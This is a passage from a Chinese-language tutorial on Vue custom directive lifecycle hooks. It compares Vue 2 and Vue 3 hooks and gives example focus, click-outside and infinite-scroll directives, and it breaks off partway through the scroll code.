0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue 自定义指令生命周期钩子完全指南</h2>
<blockquote>
<p>Vue 自定义指令提供了强大的生命周期钩子，让你可以精准控制指令在 DOM 元素上的行为。本文将深入解析所有钩子函数，并提供丰富的实用示例！</p>
</blockquote>
<h3 data-id="heading-1">一、指令生命周期概览</h3>
<h4 data-id="heading-2">1.1 生命周期钩子总览</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> myDirective = {
  <span class="hljs-comment">// 1. 绑定前（Vue 3 新增）</span>
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 2. 元素挂载时</span>
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 3. 更新前（Vue 2: bind → Vue 3: beforeUpdate）</span>
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 4. 更新后</span>
  <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 5. 卸载前（Vue 2: unbind → Vue 3: beforeUnmount）</span>
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 6. 卸载后（Vue 2: unbind → Vue 3: unmounted）</span>
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 7. Vue 2 特有</span>
  <span class="hljs-title function_">bind</span>(<span class="hljs-params"/>) {},      <span class="hljs-comment">// Vue 3 中被 beforeMount + mounted 替代</span>
  <span class="hljs-title function_">inserted</span>(<span class="hljs-params"/>) {},  <span class="hljs-comment">// Vue 3 中被 mounted 替代</span>
  <span class="hljs-title function_">componentUpdated</span>(<span class="hljs-params"/>) {}, <span class="hljs-comment">// Vue 3 中被 updated 替代</span>
  <span class="hljs-title function_">unbind</span>(<span class="hljs-params"/>) {}     <span class="hljs-comment">// Vue 3 中被 beforeUnmount + unmounted 替代</span>
}
</code></pre>
<h4 data-id="heading-3">1.2 Vue 2 vs Vue 3 对比</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 2 指令生命周期</span>
<span class="hljs-keyword">const</span> vue2Directive = {
  <span class="hljs-title function_">bind</span>(<span class="hljs-params">el, binding, vnode, oldVnode</span>) {
    <span class="hljs-comment">// 只调用一次，指令第一次绑定到元素时调用</span>
  },
  <span class="hljs-title function_">inserted</span>(<span class="hljs-params">el, binding, vnode, oldVnode</span>) {
    <span class="hljs-comment">// 被绑定元素插入父节点时调用</span>
  },
  <span class="hljs-title function_">update</span>(<span class="hljs-params">el, binding, vnode, oldVnode</span>) {
    <span class="hljs-comment">// 所在组件的 VNode 更新时调用</span>
  },
  <span class="hljs-title function_">componentUpdated</span>(<span class="hljs-params">el, binding, vnode, oldVnode</span>) {
    <span class="hljs-comment">// 指令所在组件的 VNode 及其子 VNode 全部更新后调用</span>
  },
  <span class="hljs-title function_">unbind</span>(<span class="hljs-params">el, binding, vnode, oldVnode</span>) {
    <span class="hljs-comment">// 只调用一次，指令与元素解绑时调用</span>
  }
}

<span class="hljs-comment">// Vue 3 指令生命周期（组合式API风格）</span>
<span class="hljs-keyword">const</span> vue3Directive = {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// 元素挂载前调用</span>
  },
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// 元素挂载后调用</span>
  },
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// 元素更新前调用</span>
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// 元素更新后调用</span>
  },
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// 元素卸载前调用</span>
  },
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// 元素卸载后调用</span>
  }
}
</code></pre>
<h3 data-id="heading-4">二、指令钩子函数详解</h3>
<h4 data-id="heading-5">2.1 钩子参数解析</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> directive = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// 参数详解：</span>
    
    <span class="hljs-comment">// 1. el - 指令绑定的元素</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'元素:'</span>, el)  <span class="hljs-comment">// DOM 元素</span>
    
    <span class="hljs-comment">// 2. binding - 包含指令信息的对象</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'binding 对象:'</span>, {
      <span class="hljs-comment">// 指令的值（v-my-directive="value" 中的 value）</span>
      <span class="hljs-attr">value</span>: binding.<span class="hljs-property">value</span>,
      
      <span class="hljs-comment">// 旧值（仅在 beforeUpdate 和 updated 中可用）</span>
      <span class="hljs-attr">oldValue</span>: binding.<span class="hljs-property">oldValue</span>,
      
      <span class="hljs-comment">// 参数（v-my-directive:arg 中的 arg）</span>
      <span class="hljs-attr">arg</span>: binding.<span class="hljs-property">arg</span>,
      
      <span class="hljs-comment">// 修饰符对象（v-my-directive.modifier 中的 modifier）</span>
      <span class="hljs-attr">modifiers</span>: binding.<span class="hljs-property">modifiers</span>,
      
      <span class="hljs-comment">// 指令的实例</span>
      <span class="hljs-attr">instance</span>: binding.<span class="hljs-property">instance</span>,
      
      <span class="hljs-comment">// 指令的定义对象</span>
      <span class="hljs-attr">dir</span>: binding.<span class="hljs-property">dir</span>
    })
    
    <span class="hljs-comment">// 3. vnode - 绑定元素的虚拟节点</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'虚拟节点:'</span>, {
      <span class="hljs-attr">type</span>: vnode.<span class="hljs-property">type</span>,
      <span class="hljs-attr">props</span>: vnode.<span class="hljs-property">props</span>,
      <span class="hljs-attr">children</span>: vnode.<span class="hljs-property">children</span>,
      <span class="hljs-attr">el</span>: vnode.<span class="hljs-property">el</span>,  <span class="hljs-comment">// 对应的 DOM 元素</span>
      <span class="hljs-attr">component</span>: vnode.<span class="hljs-property">component</span>,  <span class="hljs-comment">// 组件实例</span>
      <span class="hljs-attr">dirs</span>: vnode.<span class="hljs-property">dirs</span>  <span class="hljs-comment">// 指令数组</span>
    })
    
    <span class="hljs-comment">// 4. prevVnode - 先前的虚拟节点（仅在更新钩子中可用）</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'先前虚拟节点:'</span>, prevVnode)
  }
}
</code></pre>
<h4 data-id="heading-6">2.2 钩子执行时机详解</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;!-- 指令生命周期演示 --&gt;
    &lt;div 
      v-lifecycle-demo="counter" 
      v-if="showElement"
      :class="{ active: isActive }"
    &gt;
      指令生命周期演示
    &lt;/div&gt;
    
    &lt;button @click="increment"&gt;增加: {{ counter }}&lt;/button&gt;
    &lt;button @click="toggleElement"&gt;切换显示&lt;/button&gt;
    &lt;button @click="toggleClass"&gt;切换类名&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
// 生命周期演示指令
const lifecycleDemo = {
  beforeMount(el, binding) {
    console.log('1. beforeMount - 绑定前', {
      value: binding.value,
      elementExists: !!el.parentNode
    })
  },
  
  mounted(el, binding, vnode) {
    console.log('2. mounted - 挂载完成', {
      value: binding.value,
      elementInDOM: document.body.contains(el),
      parent: el.parentNode?.tagName
    })
    
    // 添加初始样式
    el.style.transition = 'all 0.3s ease'
  },
  
  beforeUpdate(el, binding) {
    console.log('3. beforeUpdate - 更新前', {
      oldValue: binding.oldValue,
      newValue: binding.value,
      willUpdate: binding.value !== binding.oldValue
    })
  },
  
  updated(el, binding) {
    console.log('4. updated - 更新完成', {
      oldValue: binding.oldValue,
      newValue: binding.value,
      elementText: el.textContent
    })
    
    // 根据值变化添加动画
    if (binding.value &gt; binding.oldValue) {
      el.style.transform = 'scale(1.1)'
      setTimeout(() =&gt; {
        el.style.transform = 'scale(1)'
      }, 300)
    }
  },
  
  beforeUnmount(el, binding) {
    console.log('5. beforeUnmount - 卸载前', {
      value: binding.value,
      elementInDOM: document.body.contains(el)
    })
    
    // 添加淡出动画
    el.style.opacity = '0.5'
  },
  
  unmounted(el, binding) {
    console.log('6. unmounted - 卸载完成', {
      value: binding.value,
      elementInDOM: false,  // 此时元素已从DOM移除
      elementReference: el  // el 仍然可以访问，但已不在DOM中
    })
  }
}

export default {
  directives: {
    'lifecycle-demo': lifecycleDemo
  },
  data() {
    return {
      counter: 0,
      showElement: true,
      isActive: false
    }
  },
  methods: {
    increment() {
      this.counter++
    },
    toggleElement() {
      this.showElement = !this.showElement
    },
    toggleClass() {
      this.isActive = !this.isActive
    }
  },
  mounted() {
    console.log('组件 mounted - 开始观察指令生命周期')
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-7">三、实用指令示例</h3>
<h4 data-id="heading-8">3.1 焦点管理指令</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 自动聚焦指令</span>
<span class="hljs-keyword">const</span> vFocus = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { value = <span class="hljs-literal">true</span>, arg = <span class="hljs-string">'auto'</span>, modifiers } = binding
    
    <span class="hljs-keyword">if</span> (value) {
      <span class="hljs-comment">// 立即聚焦</span>
      <span class="hljs-keyword">if</span> (arg === <span class="hljs-string">'immediate'</span>) {
        el.<span class="hljs-title function_">focus</span>()
      }
      <span class="hljs-comment">// 延迟聚焦</span>
      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg === <span class="hljs-string">'delay'</span>) {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          el.<span class="hljs-title function_">focus</span>()
        }, binding.<span class="hljs-property">value</span>.<span class="hljs-property">delay</span> || <span class="hljs-number">100</span>)
      }
      <span class="hljs-comment">// 条件聚焦</span>
      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg === <span class="hljs-string">'conditional'</span>) {
        <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span>.<span class="hljs-property">condition</span>) {
          el.<span class="hljs-title function_">focus</span>()
        }
      }
      <span class="hljs-comment">// 自动聚焦（默认）</span>
      <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 对于输入框，自动聚焦</span>
        <span class="hljs-keyword">if</span> (el.<span class="hljs-property">tagName</span> === <span class="hljs-string">'INPUT'</span> || el.<span class="hljs-property">tagName</span> === <span class="hljs-string">'TEXTAREA'</span>) {
          el.<span class="hljs-title function_">focus</span>()
        }
      }
      
      <span class="hljs-comment">// 处理修饰符</span>
      <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">select</span>) {
        el.<span class="hljs-title function_">select</span>()
      }
      
      <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">end</span>) {
        el.<span class="hljs-title function_">setSelectionRange</span>(el.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>, el.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>)
      }
    }
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// 值变化时重新聚焦</span>
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span> !== binding.<span class="hljs-property">oldValue</span> &amp;&amp; binding.<span class="hljs-property">value</span>) {
      el.<span class="hljs-title function_">focus</span>()
      
      <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">select</span>) {
        el.<span class="hljs-title function_">select</span>()
      }
    }
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-comment">// 卸载前移除焦点</span>
    el.<span class="hljs-title function_">blur</span>()
  }
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-comment">// &lt;input v-focus&gt;                    // 自动聚焦</span>
<span class="hljs-comment">// &lt;input v-focus.immediate&gt;         // 立即聚焦</span>
<span class="hljs-comment">// &lt;input v-focus:delay="{delay: 500}"&gt; // 延迟500ms聚焦</span>
<span class="hljs-comment">// &lt;input v-focus:conditional="{condition: shouldFocus}"&gt; // 条件聚焦</span>
<span class="hljs-comment">// &lt;input v-focus.select&gt;            // 聚焦并选中文本</span>
<span class="hljs-comment">// &lt;input v-focus.end&gt;               // 聚焦到末尾</span>
</code></pre>
<h4 data-id="heading-9">3.2 点击外部指令</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 点击外部关闭指令</span>
<span class="hljs-keyword">const</span> vClickOutside = {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// 创建事件处理函数</span>
    el.<span class="hljs-property">_clickOutsideHandler</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-comment">// 检查点击是否在元素外部</span>
      <span class="hljs-keyword">if</span> (!(el === event.<span class="hljs-property">target</span> || el.<span class="hljs-title function_">contains</span>(event.<span class="hljs-property">target</span>))) {
        <span class="hljs-comment">// 调用绑定函数</span>
        binding.<span class="hljs-title function_">value</span>(event)
      }
    }
    
    <span class="hljs-comment">// 添加事件监听</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    
    <span class="hljs-comment">// 可选：添加其他事件类型</span>
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">mousedown</span>) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousedown'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    }
    
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">touchstart</span>) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'touchstart'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    }
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// 更新时检查值是否变化</span>
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span> !== binding.<span class="hljs-property">oldValue</span>) {
      <span class="hljs-comment">// 可以在这里更新处理逻辑</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'点击外部指令值已更新'</span>)
    }
  },
  
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// 移除事件监听</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">mousedown</span>) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousedown'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    }
    
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">touchstart</span>) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'touchstart'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    }
    
    <span class="hljs-comment">// 清理引用</span>
    <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_clickOutsideHandler</span>
  }
}

<span class="hljs-comment">// 高级版本：支持配置和动态启用/禁用</span>
<span class="hljs-keyword">const</span> vClickOutsideAdvanced = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { value, modifiers, arg } = binding
    
    <span class="hljs-comment">// 默认配置</span>
    <span class="hljs-keyword">const</span> defaultConfig = {
      <span class="hljs-attr">handler</span>: value,
      <span class="hljs-attr">events</span>: [<span class="hljs-string">'click'</span>],
      <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">capture</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">immediate</span>: <span class="hljs-literal">false</span>
    }
    
    <span class="hljs-comment">// 合并配置</span>
    <span class="hljs-keyword">const</span> config = <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'function'</span> 
      ? { ...defaultConfig, <span class="hljs-attr">handler</span>: value }
      : { ...defaultConfig, ...value }
    
    <span class="hljs-comment">// 处理修饰符</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">mousedown</span>) config.<span class="hljs-property">events</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'mousedown'</span>)
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">touchstart</span>) config.<span class="hljs-property">events</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'touchstart'</span>)
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">capture</span>) config.<span class="hljs-property">capture</span> = <span class="hljs-literal">true</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">immediate</span>) config.<span class="hljs-property">immediate</span> = <span class="hljs-literal">true</span>
    
    <span class="hljs-comment">// 处理参数</span>
    <span class="hljs-keyword">if</span> (arg === <span class="hljs-string">'except'</span>) {
      <span class="hljs-comment">// 排除某些元素</span>
      config.<span class="hljs-property">except</span> = binding.<span class="hljs-property">value</span>?.<span class="hljs-property">except</span> || []
    }
    
    <span class="hljs-comment">// 存储配置</span>
    el.<span class="hljs-property">_clickOutsideConfig</span> = config
    
    <span class="hljs-comment">// 事件处理函数</span>
    el.<span class="hljs-property">_clickOutsideHandler</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (!config.<span class="hljs-property">enabled</span>) <span class="hljs-keyword">return</span>
      
      <span class="hljs-comment">// 检查点击是否在排除列表中</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">except</span>) {
        <span class="hljs-keyword">const</span> clickedInsideExcept = config.<span class="hljs-property">except</span>.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">selector</span> =&gt;</span> {
          <span class="hljs-keyword">const</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(selector)
          <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(elements).<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">element</span> =&gt;</span> 
            element.<span class="hljs-title function_">contains</span>(event.<span class="hljs-property">target</span>)
          )
        })
        
        <span class="hljs-keyword">if</span> (clickedInsideExcept) <span class="hljs-keyword">return</span>
      }
      
      <span class="hljs-comment">// 检查点击是否在元素外部</span>
      <span class="hljs-keyword">if</span> (!(el === event.<span class="hljs-property">target</span> || el.<span class="hljs-title function_">contains</span>(event.<span class="hljs-property">target</span>))) {
        config.<span class="hljs-title function_">handler</span>(event, el)
      }
    }
    
    <span class="hljs-comment">// 添加事件监听</span>
    config.<span class="hljs-property">events</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">eventName</span> =&gt;</span> {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(
        eventName, 
        el.<span class="hljs-property">_clickOutsideHandler</span>, 
        config.<span class="hljs-property">capture</span>
      )
    })
    
    <span class="hljs-comment">// 立即执行一次检查（如果配置了）</span>
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">immediate</span>) {
      <span class="hljs-comment">// 模拟外部点击</span>
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">const</span> fakeEvent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MouseEvent</span>(<span class="hljs-string">'click'</span>)
        el.<span class="hljs-title function_">_clickOutsideHandler</span>(fakeEvent)
      })
    }
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> oldConfig = el.<span class="hljs-property">_clickOutsideConfig</span>
    <span class="hljs-keyword">const</span> newValue = binding.<span class="hljs-property">value</span>
    
    <span class="hljs-comment">// 更新配置</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newValue === <span class="hljs-string">'function'</span>) {
      el.<span class="hljs-property">_clickOutsideConfig</span>.<span class="hljs-property">handler</span> = newValue
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newValue === <span class="hljs-string">'object'</span>) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(el.<span class="hljs-property">_clickOutsideConfig</span>, newValue)
    }
    
    <span class="hljs-comment">// 如果启停状态变化，可能需要更新事件监听</span>
    <span class="hljs-keyword">if</span> (oldConfig?.<span class="hljs-property">enabled</span> !== el.<span class="hljs-property">_clickOutsideConfig</span>?.<span class="hljs-property">enabled</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'点击外部指令启停状态变化'</span>)
    }
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-keyword">const</span> config = el.<span class="hljs-property">_clickOutsideConfig</span>
    
    <span class="hljs-keyword">if</span> (config &amp;&amp; el.<span class="hljs-property">_clickOutsideHandler</span>) {
      <span class="hljs-comment">// 移除所有事件监听</span>
      config.<span class="hljs-property">events</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">eventName</span> =&gt;</span> {
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(
          eventName, 
          el.<span class="hljs-property">_clickOutsideHandler</span>, 
          config.<span class="hljs-property">capture</span>
        )
      })
      
      <span class="hljs-comment">// 清理引用</span>
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_clickOutsideConfig</span>
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_clickOutsideHandler</span>
    }
  }
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-comment">// &lt;div v-click-outside="closeMenu"&gt;菜单内容&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-click-outside.advanced="{ handler: closeMenu, enabled: isOpen }"&gt;</span>
<span class="hljs-comment">// &lt;div v-click-outside:except="{ handler: closeMenu, except: ['.ignore-click'] }"&gt;</span>
<span class="hljs-comment">// &lt;div v-click-outside.mousedown.touchstart="closeMenu"&gt;</span>
</code></pre>
<h4 data-id="heading-10">3.3 滚动指令</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 滚动指令集</span>
<span class="hljs-keyword">const</span> scrollDirectives = {
  <span class="hljs-comment">// 无限滚动指令</span>
  <span class="hljs-attr">infiniteScroll</span>: {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> { <span class="hljs-attr">value</span>: callback, modifiers, arg } = binding
      
      <span class="hljs-comment">// 配置选项</span>
      <span class="hljs-keyword">const</span> options = {
        <span class="hljs-attr">distance</span>: <span class="hljs-number">50</span>,           <span class="hljs-comment">// 触发距离</span>
        <span class="hljs-attr">delay</span>: <span class="hljs-number">100</span>,            <span class="hljs-comment">// 防抖延迟</span>
        <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span>,       <span class="hljs-comment">// 立即检查</span>
        <span class="hljs-attr">disabled</span>: <span class="hljs-literal">false</span>,       <span class="hljs-comment">// 是否禁用</span>
        <span class="hljs-attr">direction</span>: <span class="hljs-string">'vertical'</span>  <span class="hljs-comment">// 滚动方向</span>
      }
      
      <span class="hljs-comment">// 解析参数</span>
      <span class="hljs-keyword">if</span> (arg === <span class="hljs-string">'distance'</span>) {
        options.<span class="hljs-property">distance</span> = <span class="hljs-built_in">parseInt</span>(binding.<span class="hljs-property">value</span>) || options.<span class="hljs-property">distance</span>
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'object'</span>) {
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(options, binding.<span class="hljs-property">value</span>)
      }
      
      <span class="hljs-comment">// 存储配置</span>
      el.<span class="hljs-property">_infiniteScrollOptions</span> = options
      
      <span class="hljs-comment">// 防抖函数</span>
      <span class="hljs-keyword">let</span> checkTimer = <span class="hljs-literal">null</span>
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkScroll</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-keyword">if</span> (options.<span class="hljs-property">disabled</span>) <span class="hljs-keyword">return</span>
        
        <span class="hljs-keyword">let</span> isAtEnd = <span class="hljs-literal">false</span>
        
        <span class="hljs-keyword">if</span> (options.<span class="hljs-property">direction</span> === <span class="hljs-string">'vertical'</span>) {
          <span class="hljs-keyword">const</span> scrollTop = el.<span class="hljs-property">scrollTop</span>
          <span class="hljs-keyword">const</span> scrollHeight = el.<span class="hljs-property">scrollHeight</span>
          <span class="hljs-keyword">const</span> clientHeight = el.<span class="hljs-property">clientHeight</span>
          
          isAtEnd = scrollHeight - scrollTop - clientHeight &lt;= options.<span class="hljs-property">distance</span>
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">const</span> scrollLeft = el.<span class="hljs-property">scrollLeft</span>
          <span class="hljs-keyword">const</span> scrollWidth = el.<span class="hljs-property">scrollWidth</span>
          <span class="hljs-keyword">const</span> clientWidth = el.<span class="hljs-property">clientWidth</span>
          
          isAtEnd = scrollWidth - scrollLeft - clientWidth &lt;= options.<span class="hljs-property">distance</span>
        }
        
        <span class="hljs-keyword">if</span> (isAtEnd) {
          <span class="hljs-title function_">callback</span>()
        }
      }
      
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">debouncedCheck</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-keyword">if</span> (checkTimer) <span class="hljs-built_in">clearTimeout</span>(checkTimer)
        checkTimer = <span class="hljs-built_in">setTimeout</span>(checkScroll, options.<span class="hljs-property">delay</span>)
      }
      
      <span class="hljs-comment">// 监听滚动事件</span>
      el.<span class="hljs-property">_infiniteScrollHandler</span> = debouncedCheck
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, el.<span class="hljs-property">_infiniteScrollHandler</span>)
      
      <span class="hljs-comment">// 监听窗口大小变化</span>
      el.<span class="hljs-property">_resizeHandler</span> = debouncedCheck
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, el.<span class="hljs-property">_resizeHandler</span>)
      
      <span class="hljs-comment">// 立即检查一次</span>
      <span class="hljs-keyword">if</span> (options.<span class="hljs-property">immediate</span>) {
        <span class="hljs-built_in">setTimeout</span>(checkScroll, <span class="hljs-number">100</span>)
      }
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> options = el.<span class="hljs-property">_infiniteScrollOptions</span>
      <span class="hljs-keyword">const</span> newValue = binding.<span class="hljs-property">value</span>
      
      <span class="hljs-comment">// 更新配置</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newValue === <span class="hljs-string">'object'</span>) {
